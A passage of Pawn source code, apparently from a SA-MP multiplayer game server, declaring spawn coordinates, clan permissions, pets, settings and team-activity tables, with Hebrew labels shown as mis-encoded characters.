	{"Police Boats",430,1000.0,{2456.7351,507.1273,-0.4275,92.3036},{2270.4609,480.1812,-0.2316,273.2406}}
};
new Float:BattlePositions[][4] =
{
	{-1421.7825,1243.6096,1039.8672,276.9759},
	{1376.9642,786.0403,10.8203,178.8121},
	{2263.3147,578.8705,7.7813,266.5969},
	{-1343.7960,995.1928,1024.2004,90.9795},
	{1096.9142,1441.5077,12.5469,172.7762},
	{-2075.2354,-515.5079,35.3359,268.4735},
	{-2079.3413,1366.2249,7.1007,1.0600},
	{735.0015,-1345.5864,13.5160,271.5925},
	{2423.9785,1828.6138,16.3222,178.7803},
	{1098.2029,1757.4526,10.8203,89.9632}
};
new Float:BattlePositions2[][4] =
{
	{-1370.9805,1250.0369,1039.8672,96.2371},
	{1374.9430,674.0170,10.8280,179.1254},
	{2364.4868,578.7991,7.7813,91.1285},
	{-1451.2709,995.2329,1024.2896,268.6177},
	{1098.4901,1385.4016,10.8203,357.8704},
	{-1998.3455,-517.1118,35.3359,89.7269},
	{-2079.6467,1432.9900,7.1016,181.0600},
	{782.4030,-1343.8732,13.5383,91.5925},
	{2418.7588,1793.1127,16.3222,359.2621},
	{1051.4525,1754.9380,10.8203,272.1800}
};
new BattleInteriors[] = {16,0,0,15,0,0,0,0,0,0};
new Float:ArmyRockets[][3] =
{
	/* army	*/ {15.6916,1720.9812,23.8750},
	/* army	*/ {237.6241,1698.7018,23.8673},
	/* army	*/ {354.2689,2030.3060,23.8673},
	/* army	*/ {187.9541,2083.4619,23.8986},
	/* vip	*/ {2466.0601,1551.3257,20.6336}
};
new Settings[][SettingsEnum] =
{
	{"Ў'рш сЎсЄщэ",1,1,"фЎт· фхуЄх· сЎсЄщэ сЎ'рш"},
	{"ф·чс°х· рхшхюшщ·",1,1,"ф·чс°х· рхшхюшщ· ьЇщ ы·хс· рщщЇщ сыЁщёф ь∙°·"},
	{"фхуЄх· ыЁщёф",1,1,"фЎт· фхуЄх· ыр∙° рЁ∙щэ ЁыЁёщэ ь∙°·"},
	{"фхуЄх· щЎщрф",1,1,"фЎт· фхуЄх· ыр∙° рЁ∙щэ щхЎрщэ юф∙°·"},
	{"фхуЄх· рщрЇўщ",1,1,"фЎт· фхуЄх· ыр∙° рЁ∙щэ Єхцсщэ цюЁщ· р· фю∙чў"},
	{"фхуЄх· ЄхЁ∙щэ",1,1,"фЎт· фхуЄх· ЄхЁ∙щэ ∙фрующя Ёх·я ь∙чўЁщэ"},
	{"юёъ счщ°· уюхщх·",2,1,"ёхт юёъ счщ°· фуюхщх·"},
	{"∙щш· ьчщюф",2,1,"∙щш· ьчщюф сюых·"},
	{"фхуЄф рхшхюшщ·",1,1,"фЎт· ффхуЄф фрхшхюшщ· ∙ь ф∙°·"},
	{"∙Єхя фю∙чў",1,0,"фЎт· ∙Єхя фю∙чў"},
	{"ёЇщухюш°",1,1,"фЎт· ёЇщухюш° ь°ысщэ"},
	{"фхуЄх· фу-∙хш",1,1,"ЎЇщщф сфхуЄх· фу-∙хш"},
	{"Ўьщьщэ",1,1,"ф∙юЄ· Ўьщьщэ ющхчущэ ∙ь фюху"},
	{"юЎс чщщэ",1,1,"фЎт· чщщэ ∙р·ф юх°щу рх щх°ущэ ьъ"},
	{"·Ўхт· ёшршё",2,1,"ёхт ·Ўхт· фёшршё ∙р·ф юЄущє"},
	{"фЎт· ёьрЇщэ",1,1,"фЎт· ёьрЇщэ ∙фрующЁщэ Ёх·Ёщэ ь∙чўЁщэ"},
	{"Ўьє юЄхЎс",2,2,"фЎт· Ўьє ЄхЎс 1 = ььр, 2 = Ўфхс, 3 = Ўфхс рухэ"},
	{"·ЁхЄф сщя ∙щтх°щэ",1,1,"рЇўш юЄс° сщя фющўхэ ∙ьъ ьющўхэ ∙р·ф ю∙·т° рьщх"},
	{"фЎт· фхуЄх· юсхў∙х·",1,1,"фхуЄх· Єьщщ· °ю· юсхў∙х·, ∙ущух· хых'"},
	{"фщш ёрхЁу",1,0,"ф∙юЄ· Ўьщь сЇтщЄф сю∙·ю∙"}
};
new ClanPermissions[][ClanPermsEnum] =
{
	{"Ўщ°хє ∙чўЁщэ ьўьря",3,100}, // clanperm_invite
	{"фхЎр· ∙чўЁщэ юфўьря",3,101}, // clanperm_kick
	{"фхЎр· ∙чўя ьр ючхс° юфўьря",3,102}, // clanperm_kickn
	{"Є°щы· Ї°шщ фўьря",3,103}, // clanperm_edit
	{"Є°щы· ЎсЄ фўьря",4,104}, // clanperm_coloredit
	//{"ЎЇщщф сЎсЄ фўьря",1,105}, // deprecated!
	{"Є°щы· сЁў фўьря",4,106}, // clanperm_bank
	{"рЇ∙°хщх· ∙ьхэ Єэ ўьрЁщэ",5,107}, // clanperm_peace
	{"фы°ц· юьчюф Єэ ўьрЁщэ",4,108}, // clanperm_war
	{"∙щЁхщ ·ртщэ",4,109}, // clanperm_settag
	{"Є°щы· фхуЄ· фўьря",2,110}, // clanperm_message
	{"Є°щы· чхўщ фўьря",4,111}, // clanperm_rules
	{"рЇ∙°хщх· Ў'рш фўьря",4,112}, // clanperm_chat
	{"∙у°хт юЄ°ых· сўьря",1,113}, // clanperm_upgrade
	{"Є°щы· ёщюЁщ фўьря",4,114}, // clanperm_signs
	{"∙щюх∙ сыхчх· фўьря",2,115}, // clanperm_power
	{"Є°щы· рцх° фўьря сюЇф",4,116}, // clanperm_gzone
	{"тщ∙ф ьюЄ°ы· ∙ьщшф с°ысщэ",4,117}, // clanperm_vcontrol
	{"тщ∙ф ьюЄ°ы· ∙ьщшф сюЇўуф",4,123}, // clanperm_hqcontrol
	{"фту°· юЎьюх· фюЇўуф",4,118}, // clanperm_camera
	{"ф∙·т°х· ьюЇўуф",1,119}, // clanperm_hq
	{"фыЁё· ыёє ьсЁў фўьря",1,120}, // clanperm_deposit
	{"фхЎр· ыёє юсЁў фўьря",1,121}, // clanperm_withdraw
	{"рЇ∙°хщх· ю∙щю· ф∙·ьшх·",4,122} // clanperm_carea
};
new ClanSystems[][ClanSystemsEnum] =
{
	{"Anti Team Kill",35000,0,100},
	{"Alert",30000,1,101},
	{"Lock Vehicles",65000,0,102},
	{"Lock Pickups",45000,0,103},
	{"Vehicle Control",40000,-1,104},
	{"HQ Control",75000,-1,105},
	{"Security",50000,1,106}
};
new Pets[][PetsEnum] =
{
	// name,			heb,			cost,	lv,	model,	radius,	size,	damage,	speed,	offset
	{"None",			"рщя",			0,		0,	0,		0.0,	0.0,	0.0,	0.0,	{0.0,0.0,0.0,0.0,0.0,0.0}},
	{"Fish",			"ут",			3000,	2,	1599,	10.0,	0.7,    0.8,    1.5,	{1.0,0.0,0.0,0.0,0.0,0.0}},
	{"Jellyfish",		"юухцф",		5000,	4,	1602,   14.0,	1.2,	1.0,	2.5,	{1.0,0.0,0.0,0.0,0.0,0.0}},
	{"Red Jellyfish",	"юухцф рухюф",	6000,	5,	1603,   18.0,	1.2,	1.5,	2.0,	{1.0,0.0,0.0,0.0,0.0,0.0}},
	{"Turtle",			"Ўс",			10000,	8,	1609,   20.0,	3.0,	1.8,	2.2,	{2.0,0.0,0.0,0.0,0.0,0.0}},
	{"Dolphin",			"ухьЇщя",		20000,	10,	1607,   30.0,	4.5,	2.5,	2.5,	{2.0,0.0,0.4,0.0,0.0,0.0}},
	{"Parrot",			"·хыщ",			20000,  9,  19078,  50.0,	1.1,	1.5,	3.0,	{0.17,-0.12,0.54,0.0,270.0,0.0}},
	{"Deer",			"Ўсщ",			35000,	13,	19315,	30.0,	4.0,	3.0,	4.0,	{1.0,0.0,-0.5,0.0,0.0,90.0}},
	{"Cow",             "Ї°ф",			35000,  13, 16442,  30.0,   7.5,    3.5,    1.5,	{3.0,0.0,1.0,0.0,0.0,90.0}},
	{"Shark",			"ы°щ∙",			50000,	16,	1608,   35.0,	5.0,	4.2,	2.6,	{4.0,0.0,1.15,0.0,0.0,0.0}}
};
new MoneyReasons[][] =
{
    {"unknown"},
	{"spawn money"},
	{"drift duel"},
	{"kill(no pickup)"},
	{"kill(pickup)"},
	{"hitman"},
	{"killing spree"},
	{"weapon spree"},
	{"work money"},
	{"achievement"},
	{"activity"},
	{"chat activity"},
	{"bot money"},
	{"vip cmd"},
	{"admin bank"},
	{"admin cmd"},
	{"upower"},
	{"player cmd"},
	{"bank"},
	{"credit card"},
	{"armour"},
	{"used /pay"},
	{"property"},
	{"property sold"},
	{"properties solds"},
	{"join activity"},
	{"vehicle comps"},
	{"vehicle sold"},
	{"gamble"},
	{"gang bank"},
	{"clan upgrade"},
	{"clan bank"},
	{"phone"},
	{"house"},
	{"pactivity"},
	{"bomb"},
	{"shop rob"},
	{"time in server"},
	{"props pay"},
	{"buy vehicle"},
	{"lcmds"},
	{"pet shop"},
	{"air strike"},
	{"code"},
	{"missions"},
	{"auction"},
	{"crash money"}
};
new WeaponTypes[][WeaponTypesEnum] =
{
	{"Pistols",{24,23}},
	{"Micro SMGs",{28,32}},
	{"Assault",{31,30}},
	{"Snipers",{34,33}},
	{"Throw",{16,18}},
	{"RPG",{35,36}}
};
new WarInteriors[] = {16,0,0,0,0,0,10,15,0,15,0,0};
new Float:WarPositions_1[][4] = // war
{
	{-1430.9329,1259.6521,1039.8672,254.7156},
	{-1431.8860,1253.7933,1039.8672,260.4601},
	{-1432.5056,1247.8628,1039.8672,266.7268},
	{-1432.0901,1241.8976,1039.8672,274.0380},
	{-1430.9341,1236.6349,1039.8672,285.5270},
	{-1428.5359,1230.3431,1039.8672,293.3604},
	{-1425.1649,1225.5625,1039.8672,303.8049},
	{-1420.9004,1220.4844,1039.8741,318.4273},
	{-1415.3600,1215.9824,1039.8672,328.3496},
	{-1409.3510,1213.2399,1039.8672,339.8386},
	{-1402.9584,1211.7975,1039.8672,351.3276},
	{-1395.6345,1211.2839,1039.8672,4.3833},
	{-1389.3068,1213.2089,1039.8672,20.0502},
	{-1383.3143,1215.4729,1039.8672,25.2724},
	{-1378.1449,1218.4443,1039.8672,31.5392},
	{-1373.4987,1222.0001,1039.8672,44.0726},
	{-1369.5491,1227.6154,1039.8672,60.2617},
	{-1366.5486,1234.3701,1039.8672,73.3173},
	{-1365.5688,1241.4601,1039.8741,86.3730},
	{-1365.7275,1249.2192,1039.8672,102.5620},
	{-1367.6246,1256.1986,1039.8672,116.1399},
	{-1370.7230,1262.5270,1039.8672,123.4511},
	{-1375.2396,1268.4470,1039.8741,139.6402},
	{-1381.0576,1275.0394,1039.8672,153.2181},
	{-1387.8148,1278.0211,1039.8672,162.6182}
};
new Float:WarPositions_2[][4] = // iraq
{
	{-1299.7264,2546.5657,87.7422,274.1018},
	{-1303.9529,2555.9031,87.0958,2.0436},
	{-1307.3884,2553.4380,87.4290,83.2395},
	{-1319.5493,2539.9519,87.5587,6.9747},
	{-1314.6217,2541.5100,87.7422,289.0962},
	{-1311.6113,2528.7515,87.6399,32.1510},
	{-1310.1027,2522.9004,87.4097,212.1510},
	{-1315.6029,2508.7024,87.0420,34.4021},
	{-1309.2416,2492.9487,89.8672,181.8151},
	{-1316.5099,2503.3513,89.5703,337.7607},
	{-1321.2992,2503.0444,89.5703,157.7608},
	{-1320.9303,2508.5989,92.5406,195.6216},
	{-1321.3324,2514.3613,92.5406,15.6216},
	{-1325.7001,2526.6069,89.9844,15.6216},
	{-1337.9225,2522.8469,87.0469,127.7751}
};
new Float:WarPositions_3[][4] = // sfb
{
	{-1771.3129,578.7349,234.8906,120.5090},
	{-1788.5846,569.0062,234.8906,299.5690},
	{-1779.3348,562.8102,234.8874,54.7085},
	{-1796.2888,554.1245,234.8906,247.4828},
	{-1786.3082,549.7634,234.8874,61.4569},
	{-1806.5764,539.0453,234.8906,171.6554},
	{-1806.8485,519.7870,234.8906,2.5497},
	{-1815.2010,529.1190,234.8874,300.1233},
	{-1817.4200,553.0737,234.8906,128.3659},
	{-1824.6910,545.6781,234.8874,313.8376},
	{-1823.8497,569.6075,234.8906,62.0111},
	{-1840.1505,579.0613,234.8874,243.1919},
	{-1826.4963,581.2358,234.8906,178.0904}
};
new Float:WarPositions_4[][4] = // as
{
	{-12.0735,2476.9707,16.4844,2.9658},
	{-13.5855,2527.0771,16.4844,179.2783},
	{-32.3361,2527.5994,16.4844,177.9525},
	{-32.8142,2479.9209,16.4844,359.7600},
	{-50.4669,2479.6086,16.4844,0.1458},
	{-53.8004,2525.0557,16.4922,182.0983},
	{-77.1960,2525.6443,16.4844,228.3271},
	{-79.8230,2514.1440,16.4922,272.5801},
	{-80.3777,2493.3745,16.4844,274.1468},
	{-75.5457,2481.5015,16.4922,313.2413}
};
new Float:WarPositions_5[][4] = // pro house
{
	{156.1103,-278.0548,1.5781,91.4400},
	{155.9345,-258.2524,1.5724,89.5600},
	{156.1619,-250.6108,1.5724,90.1142},
	{143.0531,-244.9068,1.5724,135.6204},
	{142.0627,-234.3857,1.5781,91.1267},
	{120.8929,-238.9036,1.5781,185.0552},
	{120.5005,-223.2974,1.5781,270.8134},
	{102.7337,-242.0076,1.5781,146.4189}
};
new Float:WarPositions_6[][4] = // golf
{
	{1210.3959,2802.4202,10.8203,59.5007},
	{1205.8462,2797.1235,10.8203,237.6208},
	{1204.6350,2792.4199,10.8203,79.8675},
	{1220.6993,2794.0925,10.8203,320.2690},
	{1202.9796,2822.5203,10.5364,55.8365},
	{1189.2433,2811.6389,10.8203,236.0049},
	{1181.6046,2806.4390,10.8203,113.8037},
	{1158.5980,2781.3999,10.8125,208.1905},
	{1141.3622,2769.8901,10.1887,162.5638},
	{1128.5446,2760.9500,10.2742,187.0519},
	{1134.4965,2742.7317,10.8125,280.5712},
	{1166.7140,2730.9065,10.8281,238.5116},
	{1179.7065,2734.1316,10.8281,11.7520},
	{1200.2938,2731.6641,10.8281,11.7520},
	{1205.9816,2737.4893,10.8281,11.7520}
};
new Float:WarPositions_7[][4] = // heavy
{
	{-1081.6062,1046.2057,1343.5325,222.5462},
	{-1037.1414,1063.9246,1344.3984,77.1815},
	{-1008.3450,1078.9255,1343.2269,83.4482},
	{-978.9857,1053.2493,1344.9834,80.6283},
	{-1058.4739,1061.0720,1343.9114,291.5036},
	{-1127.6195,1066.2969,1345.7368,268.1484},
	{-975.0240,1055.9875,1345.0078,79.3358},
	{-974.3430,1070.9658,1344.9949,80.4716},
	{-991.4177,1083.7632,1342.6733,127.1979},
	{-994.4700,1064.0679,1342.8243,56.2115},
	{-1001.9753,1042.8842,1342.2197,314.7531},
	{-995.7480,1028.7510,1341.8438,87.8585},
	{-1018.7202,1024.3384,1344.0984,45.0097},
	{-1030.8396,1044.2985,1341.7856,259.6609},
	{-1029.5619,1055.0835,1343.0619,344.7317},
	{-1033.2004,1069.0222,1344.2559,237.6099},
	{-1028.9589,1087.2690,1343.2711,54.0965},
	{-1044.2458,1086.8855,1346.0165,184.8752},
	{-1042.8431,1072.4019,1347.4537,267.6743},
	{-1042.8165,1060.8737,1345.9280,148.2932},
	{-1044.1879,1035.4626,1342.8119,143.4757},
	{-1060.7253,1035.0229,1345.6879,25.1912},
	{-1061.5637,1060.5579,1346.9504,331.1015},
	{-1059.1779,1081.7328,1342.5955,92.2843},
	{-1066.5837,1097.2791,1343.0957,236.0274},
	{-1082.7657,1094.9008,1343.6514,218.0889},
	{-1080.2703,1072.2965,1341.7731,259.7000},
	{-1081.4653,1056.7813,1343.1924,52.5064},
	{-1083.0643,1039.8846,1344.0302,218.7705},
	{-1089.2383,1028.3816,1342.9182,27.1262},
	{-1093.4750,1042.9446,1343.5194,222.9771},
	{-1088.8274,1046.3198,1347.4005,118.5187},
	{-1112.2683,1031.3719,1342.9479,313.5471},
	{-1117.5491,1050.1567,1343.0214,231.4138},
	{-1116.5314,1066.7682,1342.9103,40.2629},
	{-1117.8730,1081.2332,1341.9568,299.6428},
	{-1117.9584,1098.8282,1341.8438,90.7316},
	{-1132.7811,1028.1888,1349.1802,285.6602},
	{-1135.9630,1021.4603,1345.7479,300.1520},
	{-1133.3214,1043.8525,1345.7509,235.3305},
	{-1132.6558,1062.4264,1345.7653,245.2398}
};
new Float:WarPositions_8[][4] = // type of bumper
{
	{-1330.3738,992.7831,1025.1305,85.1680},
	{-1330.6617,1001.3008,1025.2853,104.2815},
	{-1335.8474,1011.1432,1025.5195,104.2815},
	{-1345.0231,1016.9699,1025.5336,147.2811},
	{-1355.9650,1022.3275,1025.6545,151.9812},
	{-1371.3550,1025.5282,1025.7408,175.4814},
	{-1389.4142,1025.4087,1025.7303,175.4814},
	{-1407.2041,1026.3291,1025.8589,175.4814},
	{-1424.5248,1023.6862,1025.5897,175.4814},
	{-1445.3032,1020.6319,1025.7736,176.6622},
	{-1463.1862,1004.5083,1025.4529,267.9156},
	{-1462.8206,992.7816,1025.1090,267.9156},
	{-1460.0266,980.4929,1025.1501,303.2500},
	{-1449.2594,971.8439,1025.0416,303.2500},
	{-1433.7968,967.6046,1024.8159,303.2500},
	{-1416.8889,965.4616,1024.7924,6.5439},
	{-1407.3849,967.3851,1024.6038,358.7105},
	{-1389.6808,965.1296,1024.8022,355.3364},
	{-1372.7164,966.4498,1024.6570,355.3364},
	{-1359.0189,967.1764,1024.8199,16.0166},
	{-1348.8074,971.2712,1024.8420,21.0300}
};
new Float:WarPositions_9[][4] = // minigun madness
{
	{2544.5032,2805.8840,19.9922,257.5800},
	{2556.2554,2832.5313,19.9922,1.9000},
	{2561.9175,2848.5532,19.9922,256.6609},
	{2613.9866,2848.4475,19.9922,102.2487},
	{2611.5500,2845.7542,16.7020,87.5428},
	{2545.9243,2839.1824,10.8203,176.2378},
	{2647.6553,2805.0278,10.8203,285.1536},
	{2672.9387,2800.3374,10.8203,60.4288},
	{2672.8306,2792.1057,10.8203,121.8451},
	{2647.7834,2697.5884,19.3222,353.1684},
	{2654.5427,2720.3474,19.3222,303.5359},
	{2653.2063,2738.2432,19.3222,342.1389},
	{2641.1350,2703.2019,25.8222,191.6982},
	{2599.1304,2700.7249,25.8222,76.3487},
	{2606.1384,2721.5237,25.8222,261.2564},
	{2597.3745,2748.0884,23.8222,273.2050},
	{2595.0657,2776.6729,23.8222,254.3630},
	{2601.3640,2777.8101,23.8222,253.4439},
	{2584.3940,2825.1748,27.8203,244.5475},
	{2631.8110,2834.2593,40.3281,213.2975},
	{2632.2852,2834.9390,122.9219,197.6725},
	{2646.1997,2817.7070,36.3222,182.0474},
	{2685.8875,2816.6575,36.3222,129.9525},
	{2691.1233,2787.7883,59.0212,208.0777},
	{2717.8071,2771.3464,74.8281,72.3429},
	{2695.2622,2699.5488,22.9472,66.3686},
	{2688.8206,2689.0039,28.1563,14.8979},
	{2655.0229,2650.6807,36.9154,341.8097},
	{2570.4668,2701.2876,22.9507,204.0154},
	{2498.9915,2704.6204,10.9844,168.9241},
	{2524.1584,2743.3735,10.9917,150.3771},
	{2498.3167,2782.3357,10.8203,251.7015},
	{2504.5142,2805.9763,14.8222,108.6137},
	{2522.2144,2814.7087,24.9536,265.9478},
	{2510.6292,2849.6384,14.8222,191.4991},
	{2618.2646,2720.8005,36.5386,346.6828},
	{2690.9980,2741.9060,19.0722,91.6099}
};
new Float:WarPositions_10[][4] = // matrix house
{
	{2241.5706,-1188.9576,1033.7969,274.3598},
	{2246.6978,-1194.4188,1029.7969,27.0415},
	{2243.9053,-1189.2682,1029.7969,91.9439},
	{2230.9893,-1167.4955,1029.7969,7.1466},
	{2196.4565,-1191.4388,1029.8043,317.5227},
	{2190.2034,-1180.8423,1033.7896,181.2005},
	{2186.4993,-1186.8073,1029.7969,303.9878},
	{2204.7417,-1172.9011,1029.7969,87.8706},
	{2193.4519,-1149.3362,1029.8043,359.0711},
	{2198.9976,-1145.9678,1029.7969,15.8646},
	{2234.9316,-1158.2003,1029.7969,257.1937}
};
new Float:WarPositions_11[][4] = // katana street
{
	{-2181.0132,615.4708,35.1641,155.0595},
	{-2187.4316,616.2361,35.1641,181.3797},
	{-2195.0259,615.2629,35.1641,205.1933},
	{-2197.1318,615.3232,35.1641,157.0191},
	{-2193.0637,603.8734,35.1641,24.1880},
	{-2207.4507,606.4207,35.1641,269.9886},
	{-2207.1252,603.7524,35.1641,269.9886},
	{-2207.5300,609.3476,36.8120,181.6278},
	{-2180.3191,602.9995,35.1691,11.1730},
	{-2212.4329,597.0797,35.1641,6.8096},
	{-2214.9578,613.2496,35.1641,180.0612}
};
new Float:WarPositions_12[][4] = // ship army
{
	{-1296.7271,490.4745,11.1953,79.9930},
	{-1318.2661,489.5223,11.1953,326.1070},
	{-1320.3695,500.2506,11.1953,127.4986},
	{-1320.9930,516.5690,11.1971,99.9250},
	{-1370.3872,516.6614,11.1971,268.8133},
	{-1362.1631,505.8155,13.2066,14.1667},
	{-1397.5072,499.7128,11.1953,212.7261},
	{-1369.9290,502.4708,11.1953,358.9583},
	{-1346.0381,490.4417,11.2027,359.8607}
};
new Float:WarPositions_13[][4] = // zombies
{
	{2618.4480,2720.3601,36.5386},
	{2553.7202,2662.6643,10.8203},
	{2593.3369,2635.2217,10.8203},
	{2592.5950,2682.1035,10.8203},
	{2702.9810,2676.8125,12.8222},
	{2711.8787,2689.0344,10.8203},
	{2742.2144,2676.1978,10.8203},
	{2650.2083,2764.8711,10.8203},
	{2669.6365,2749.5422,10.8203},
	{2669.0569,2718.3254,10.8203},
	{2669.5381,2800.2903,10.8203},
	{2623.2732,2690.1692,10.8203},
	{2589.8367,2711.1460,10.8203},
	{2592.8054,2724.2388,10.9844},
	{2554.9224,2723.3096,10.9844},
	{2525.3623,2739.7651,10.8203},
	{2535.5908,2765.7095,10.9917},
	{2593.7314,2789.7024,10.8203},
	{2593.2412,2800.7517,10.8203},
	{2606.4644,2810.3613,10.8203},
	{2586.1406,2846.9304,10.8203},
	{2547.8835,2809.7754,10.8203},
	{2545.9690,2837.9890,10.8203},
	{2626.7468,2841.2273,10.8203},
	{2677.6882,2845.3799,10.8203},
	{2693.0413,2844.1038,10.8203},
	{2716.8174,2828.3469,10.8203},
	{2627.1282,2848.8340,10.8203},
	{2617.8843,2854.1282,10.8203},
	{2744.3364,2764.8342,10.8203},
 	{2675.3398,2798.1226,10.8203},
	{2688.1431,2769.3162,10.8203},
	{2640.6121,2781.8672,23.8222},
	{2640.6121,2781.8672,23.8222},
	{2614.3027,2776.2678,23.8222},
	{2608.8271,2758.5898,23.8222},
	{2605.8716,2727.7134,23.8222},
 	{2621.7275,2740.2449,30.9056},
	{2503.7869,2691.1462,10.8130}
};
new TemporaryActivityPickups[][32] =
{
    "Vehicle Repair (+5)",
	"Vehicle Repair (+10)",
	"Vehicle Repair (+15)",
	"More Speed",
	"More Speed (X2)",
	"Less Speed",
	"Godmod",
	"Freeze Time",
	"Kill",
	"Explode",
	"No Engine",
	"Random",
	"Dumper"
};
new PlayerStatus[][PlayerStatusEnum] =
{
	{"ю∙чў с∙°·",false},
	{"сў°с",true},
	{"срёўщщЇ - ючхї ь∙°·",true},
	{"сЇЄщьх·",true},
	{"ссчщ°· уюхщх·",false},
	{"ю∙чў срцх° ущрэ",true},
	{"ў°с Ї°шщ",true},
	{"у°щЇш Ї°шщ",true},
	{"ющ°хї Ї°шщ",true},
	{"сюЁхє",false},
	{"сюЄўс",false},
	{"сюьчю· ўьрЁщэ",true},
	{"сюшххч щ°щх·",true},
	{"срцх° шёшщэ",true},
	{"Ёхфт с°ыс",false}
};
new SRaceTypes[][SRaceType] =
{
	{"/srace","Special Race",1,{lightyellow,yellow,orange},20.0,1},
	{"/waterace","Water Race",2,{darkblue,blue,lightblue},7.0,2},
	{"/ironman","Iron Man",3,{lightyellow,yellow,orange},20.0,3},
	{"/superman","Super Man",4,{purple,lightpurple,pink},12.0,4}
};
new TeamActivityInteriors[] = {0,0};
new Float:TeamActivityPositions_1[][4] = // sea fight #1
{
	{267.2122,2911.8379,6.6635,18.3887},
	{261.8324,2910.7385,6.3529,17.4487},
	{258.3008,2925.1868,1.7813,17.4487},
	{258.0478,2937.7649,1.7661,356.3102},
	{253.0644,2914.4873,3.9263,19.6420},
	{262.1998,2897.6563,9.5459,31.0905},
	{252.8053,2895.0413,10.3511,6.7952},
	{279.9239,2906.6626,13.7041,45.3356},
	{272.8263,2890.1814,10.3817,20.5820},
	{260.1523,2883.6057,12.6202,20.5820}
};
new Float:TeamActivityPositions_2[][4] = // sea fight #2
{
	{296.5219,3056.9143,0.8189,179.1339},
	{286.7207,3056.1489,1.0894,171.0598},
	{278.0785,3056.7395,0.9908,158.9405},
	{269.3596,3058.2522,0.6661,167.3210},
	{261.9366,3058.1985,0.2764,168.9674},
	{253.6784,3058.5679,0.2698,178.7623},
	{245.6073,3058.9690,0.7510,180.7833},
	{237.7178,3059.9089,0.8544,174.7959},
	{266.5186,3088.8335,-0.9201,177.7897},
	{257.8728,3089.2705,-0.9478,182.4897}
};
new Float:TeamActivityPositions_3[][4] = // air fight #1
{
	{431.3559,2520.4783,16.4844,87.8102},
	{431.0629,2510.1665,16.4844,105.0437},
	{430.3471,2497.3303,16.4844,87.4969},
	{408.2487,2462.7690,16.5000,3.8595},
	{393.9267,2463.4382,16.5000,354.7002},
	{393.6616,2440.0864,16.5000,5.1128},
	{407.3889,2439.8767,16.5000,1.0395},
	{414.6414,2528.3643,16.6059,178.2195},
	{402.3911,2542.0989,16.5454,245.9001},
	{417.3948,2545.0293,16.3761,272.7512}
};
new Float:TeamActivityPositions_4[][4] = // air fight #2
{
	{-73.9241,2458.7866,16.2282,264.4584},
	{-74.0051,2472.3345,16.4844,267.2784},
	{-73.8833,2485.3306,16.4844,269.7850},
	{-75.6673,2497.8091,16.4844,268.2183},
	{-76.4931,2512.0522,16.4844,273.2317},
	{-78.0058,2525.1533,16.4844,272.9184},
	{-79.1494,2539.8765,16.4844,272.9183},
	{-79.4555,2551.3801,16.6841,277.9317}
};
new Float:TeamActivityPositions_5[][4] = // yvm yakuza
{
	{-2186.7590,713.6080,53.8975,181.0103},
	{-2186.7590,716.6080,53.8975,181.0103},
	{-2184.7590,713.6080,53.8975,181.0103},
	{-2184.7590,716.6080,53.8975,181.0103},
	{-2182.7590,713.6080,53.8975,181.0103},
	{-2182.7590,716.6080,53.8975,181.0103},
	{-2180.7590,713.6080,53.8975,181.0103},
	{-2180.7590,716.6080,53.8975,181.0103},
	{-2178.7590,713.6080,53.8975,181.0103},
	{-2178.7590,716.6080,53.8975,181.0103},
	{-2176.7590,713.6080,53.8975,181.0103},
	{-2176.7590,716.6080,53.8975,181.0103}
};
new Float:TeamActivityPositions_6[][4] = // yvm mafia
{
	{-2184.3193,641.2845,49.4375,2.9280},
	{-2184.3193,644.2845,49.4375,2.9280},
	{-2182.3193,641.2845,49.4375,2.9280},
	{-2182.3193,644.2845,49.4375,2.9280},
	{-2180.3193,641.2845,49.4375,2.9280},
	{-2180.3193,644.2845,49.4375,2.9280},
	{-2178.3193,641.2845,49.4375,2.9280},
	{-2178.3193,644.2845,49.4375,2.9280},
	{-2176.3193,641.2845,49.4375,2.9280},
	{-2176.3193,644.2845,49.4375,2.9280},
	{-2174.3193,641.2845,49.4375,2.9280},
	{-2174.3193,644.2845,49.4375,2.9280}
};
new Float:TeamActivityPositions_7[][4] = // cs ct
{
	{-887.2173,1963.2727,60.3414,9.2823},
	{-885.2173,1963.2727,60.3414,9.2823},
	{-883.2173,1963.2727,60.3414,9.2823},
	{-881.2173,1963.2727,60.3414,9.2823},
	{-879.2173,1963.2727,60.3414,9.2823},
	{-877.2173,1963.2727,60.3414,9.2823},
	{-887.2173,1960.2727,60.3414,9.2823},
	{-885.2173,1960.2727,60.3414,9.2823},
	{-883.2173,1960.2727,60.3414,9.2823},
	{-881.2173,1960.2727,60.3414,9.2823},
	{-879.2173,1960.2727,60.3414,9.2823},
	{-877.2173,1960.2727,60.3414,9.2823},
	{-887.2173,1957.2727,60.3414,9.2823},
	{-885.2173,1957.2727,60.3414,9.2823},
	{-883.2173,1957.2727,60.3414,9.2823},
	{-881.2173,1957.2727,60.3414,9.2823},
	{-879.2173,1957.2727,60.3414,9.2823},
	{-877.2173,1957.2727,60.3414,9.2823}
};
new Float:TeamActivityPositions_8[][4] = // cs t
{
	{-528.9626,2002.3213,60.1875,48.8633},
	{-530.1027,2001.0649,60.1875,48.2928},
	{-531.4241,1999.7905,60.1875,43.0223},
	{-532.4127,1998.3218,60.1875,51.5386},
	{-533.5799,1997.0640,60.1875,46.5815},
	{-534.5269,1996.2737,60.2922,46.3243},
	{-542.2145,1985.0925,60.1875,49.8272},
	{-541.2559,1986.3435,60.1875,45.4967},
	{-540.2336,1987.3826,60.1875,42.4195},
	{-538.9950,1988.7277,60.1875,42.4757},
	{-537.7869,1989.8170,60.1875,43.7853},
	{-537.1167,1991.2736,60.2771,44.7815},
	{-532.6144,1986.8768,60.1875,54.8082},
	{-531.6278,1988.1182,60.3906,47.0311},
	{-530.4846,1989.8531,60.3906,49.5940},
	{-529.3783,1991.1317,60.3906,54.6635},
	{-528.6526,1991.9923,60.2368,50.0197},
	{-527.8846,1992.9559,60.1934,44.7492}
};
new TeamActivities[][TeamActEnum] =
{
	{"/seafight","Sea Fight (Boats)",0,4,sizeof(TeamActivityPositions_1),team_activity,22,4,
		"Team A",red,{100.0,0.0},{8,29,30,-1,-1},{0,1000,1000,-1,-1},{-1,-1,-1},1,
		"Team B",green,{100.0,0.0},{8,29,30,-1,-1},{0,1000,1000,-1,-1},{-1,-1,-1},2,
	"Єьщъ ьф∙·ю∙ сёщ°х· фщх°х· хсЁ∙ўщщъ ыущ ьЄцх° ьўсхЎф ∙ьъ ьЁЎч сў°с фщющ"},
	{"/airfight","Air Fight (Planes)",0,4,sizeof(TeamActivityPositions_3),team_activity,8,4,
		"Team A",red,{100.0,0.0},{31,34,-1,-1,-1},{1000,1000,-1,-1,-1},{-1,-1,-1},3,
